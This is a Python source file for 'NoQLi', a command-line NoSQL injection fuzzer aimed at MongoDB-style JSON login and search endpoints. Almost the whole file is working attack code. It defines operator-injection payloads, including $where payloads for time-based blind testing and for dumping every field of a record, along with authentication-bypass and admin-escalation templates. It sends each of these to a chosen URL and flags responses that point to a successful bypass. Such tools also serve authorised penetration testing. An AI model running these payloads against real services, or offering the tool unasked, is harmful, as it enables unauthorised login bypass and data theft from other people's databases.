#!/usr/bin/env python3
"""
NoQLi — NoSQL injection fuzzer for Schatten Brutal.
Targets MongoDB-style JSON APIs with operator injection.

Usage:
    python3 noqli.py <target_url> [options]

Options:
    --method METHOD      HTTP method (default: POST)
    --data JSON          JSON body template with {INJECT} placeholder
    --field FIELD        Field to inject into (default: tries all)
    --wordlist FILE      File with strings to regex-match
    --auth HEADER        Auth header value
    --output FILE        Save results
"""

import sys
import json
import time
import argparse
from pathlib import Path

try:
    import requests
except ImportError:
    print("pip install requests"); sys.exit(1)


# NoSQL injection payloads
OPERATOR_PAYLOADS = [
    # Comparison operators
    {"$gt": ""},
    {"$gte": ""},
    {"$lt": "z"},
    {"$lte": "z"},
    {"$ne": ""},
    {"$eq": ""},
    # Regex
    {"$regex": ".*"},
    {"$regex": "^a"},
    # Existence
    {"$exists": True},
    {"$exists": False},
    # Logical
    {"$or": [{"a": "a"}, {"b": "b"}]},
    {"$and": [{"a": "a"}, {"a": "a"}]},
    {"$not": {"$eq": ""}},
    # Where (code injection)
    {"$where": "1==1"},
    {"$where": "sleep(5000)"},
    {"$where": "this.password.length > 0"},
    # Array
    {"$in": ["admin"]},
    {"$nin": []},
    # Elements
    {"$elemMatch": {"$gt": ""}},
]

# Multi-field injection templates
MULTI_FIELD_PAYLOADS = [
    # Bypass auth: inject on both fields
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"email": {"$gt": ""}, "password": {"$gt": ""}},
    {"login": {"$gt": ""}, "pass": {"$gt": ""}},
    {"user": {"$ne": ""}, "pwd": {"$ne": ""}},
    # Admin escalation
    {"$where": "this.role='admin'"},
    {"role": {"$regex": "admin"}},
    {"isAdmin": True},
    {"admin": True},
    # Extract all
    {"$where": "function(){var i='';for(var k in this){i+=k+':'+this[k]+'|'}return i}"},
]

# Auth bypass templates
AUTH_BYPASS = [
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"username": {"$exists": True}, "password": {"$exists": True}},
    {"email": {"$gt": ""}, "password": {"$gt": ""}},
    {"user": "admin", "password": {"$gt": ""}},
    {"$or": [{"username": "admin"}, {"email": "admin"}], "password": {"$gt": ""}},
]


def test_payload(url: str, method: str, payload: dict, headers: dict,
                  field: str = None, timeout: int = 10) -> dict:
    """Send a single payload and measure response."""
    body = payload
    if field:
        body = {field: payload}

    start = time.time()
    try:
        if method.upper() == "GET":
            r = requests.get(url, params=body, headers=headers, timeout=timeout, allow_redirects=False)
        elif method.upper() == "POST":
            r = requests.post(url, json=body, headers=headers, timeout=timeout, allow_redirects=False)
        elif method.upper() == "PUT":
            r = requests.put(url, json=body, headers=headers, timeout=timeout, allow_redirects=False)
        else:
            r = requests.request(method, url, json=body, headers=headers, timeout=timeout, allow_redirects=False)

        elapsed = time.time() - start
        return {
            "status": r.status_code,
            "length": len(r.text),
            "time": round(elapsed, 3),
            "body_preview": r.text[:300],
            "payload": body,
        }
    except requests.Timeout:
        return {"status": "TIMEOUT", "time": round(time.time() - start, 3), "payload": body}
    except requests.RequestException as e:
        return {"error": str(e), "payload": body}


def detect_baseline(url: str, method: str, headers: dict) -> dict:
    """Get baseline response for comparison."""
    normal = {"username": "normaluser", "password": "wrongpassword"}
    result = test_payload(url, method, normal, headers)
    return result


def run_auth_bypass(url: str, method: str, headers: dict, output_file: str = None):
    """Run NoSQL auth bypass attacks."""
    print("[*] Phase 1: Auth Bypass")
    print(f"    Baseline detection...")

    baseline = detect_baseline(url, method, headers)
    print(f"    Baseline: status={baseline.get('status')} len={baseline.get('length')} time={baseline.get('time')}s")

    results = []
    for i, payload in enumerate(AUTH_BYPASS):
        result = test_payload(url, method, payload, headers)
        is_interesting = False

        # Detect potential bypass
        if result.get("status") == 200:
            is_interesting = True
        elif result.get("length", 0) > (baseline.get("length", 0) * 2):
            is_interesting = True
        elif result.get("time", 0) > 4.0:  # Time-based blind
            is_interesting = True

        status_marker = "[!]" if is_interesting else "[-]"
        print(f"    {status_marker} {i+1}/{len(AUTH_BYPASS)} status={result.get('status')} len={result.get('length')} time={result.get('time')}s")

        if is_interesting:
            print(f"        PAYLOAD: {json.dumps(payload)}")
            print(f"        RESPONSE: {result.get('body_preview', '')[:150]}")
            result["attack"] = "auth_bypass"
            results.append(result)

        time.sleep(0.3)  # Rate limit respect

    return results


def run_operator_injection(url: str, method: str, headers: dict, field: str = None):
    """Test individual operator injections."""
    print("\n[*] Phase 2: Operator Injection")
    results = []

    fields_to_test = [field] if field else ["username", "email", "user", "login", "q", "search", "name", "filter"]

    for f in fields_to_test:
        print(f"\n  Field: {f}")
        for i, payload in enumerate(OPERATOR_PAYLOADS):
            result = test_payload(url, method, {f: payload}, headers)
            is_interesting = result.get("status") not in (400, 404, 422)

            if is_interesting:
                print(f"    [!] {json.dumps(payload)} → status={result.get('status')} len={result.get('length')}")
                result["attack"] = f"operator_{f}"
                results.append(result)

            time.sleep(0.2)

    return results


def run_multi_field(url: str, method: str, headers: dict):
    """Test multi-field injection patterns."""
    print("\n[*] Phase 3: Multi-Field Injection")
    results = []

    for i, payload in enumerate(MULTI_FIELD_PAYLOADS):
        result = test_payload(url, method, payload, headers)
        is_interesting = result.get("status") not in (400, 404, 422)

        if is_interesting:
            print(f"  [!] status={result.get('status')} len={result.get('length')}")
            print(f"      PAYLOAD: {json.dumps(payload)[:120]}")
            result["attack"] = "multi_field"
            results.append(result)

        time.sleep(0.3)

    return results


def main():
    parser = argparse.ArgumentParser(description="NoQLi — NoSQL Injection Fuzzer")
    parser.add_argument("target", help="Target URL (login endpoint or search)")
    parser.add_argument("--method", default="POST", help="HTTP method")
    parser.add_argument("--data", help="JSON body template with INJECT placeholder")
    parser.add_argument("--field", help="Specific field to inject into")
    parser.add_argument("--auth", help="Auth header: 'Authorization: Bearer xxx'")
    parser.add_argument("--output", help="Output file")
    parser.add_argument("--quick", action="store_true", help="Skip operator/multi-field phases")
    args = parser.parse_args()

    headers = {"Content-Type": "application/json"}
    if args.auth:
        parts = args.auth.split(":", 1)
        headers[parts[0].strip()] = parts[1].strip()

    print(f"[*] Target: {args.target}")
    print(f"[*] Method: {args.method}")
    print()

    all_results = []

    # Phase 1: Auth bypass
    auth_results = run_auth_bypass(args.target, args.method, headers, args.output)
    all_results.extend(auth_results)

    if not args.quick:
        # Phase 2: Operator injection
        op_results = run_operator_injection(args.target, args.method, headers, args.field)
        all_results.extend(op_results)

        # Phase 3: Multi-field
        multi_results = run_multi_field(args.target, args.method, headers)
        all_results.extend(multi_results)

    # Summary
    print("\n" + "=" * 60)
    print(f"[*] COMPLETE — {len(all_results)} interesting responses found")
    if all_results:
        for r in all_results:
            print(f"  {r.get('attack', '?')} → status={r.get('status')} payload={json.dumps(r.get('payload', {}))[:80]}")

    if args.output:
        out_path = Path(args.output)
        if out_path.is_dir() or not out_path.suffix:
            out_path = out_path / "04_nosql_results.json"
        out_path.write_text(json.dumps(all_results, indent=2, default=str))
        print(f"\n[+] Results saved to {out_path}")

    return 0 if not all_results else 1


if __name__ == "__main__":
    sys.exit(main())
